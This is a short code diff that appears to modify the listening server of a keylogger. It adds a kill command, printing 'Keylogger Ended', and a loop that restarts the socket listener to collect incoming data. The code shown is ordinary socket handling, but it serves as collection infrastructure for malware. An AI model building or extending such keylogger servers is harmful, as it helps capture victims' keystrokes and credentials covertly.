@@ -1,6 +1,7 @@
 import socket, os, sys
 
 port = int(sys.argv[1])
+killed = False
 
 def createSocket():
 	try:
@@ -41,10 +42,19 @@ def acceptSocket():
 
 def menu():
 	global currentPath
-	while True:
-		result = conn.recv(16834).decode()
-		print(result)
+	global killed
+	while not killed:
 
-createSocket()
-bindSocket()
-acceptSocket()
+		result = conn.recv(16834).decode()
+
+		if result:
+			if result == 'kill':
+				print("Keylogger Ended")
+				killed = True
+			print(result)
+
+while True:
+	killed = False
+	createSocket()
+	bindSocket()
+	acceptSocket()
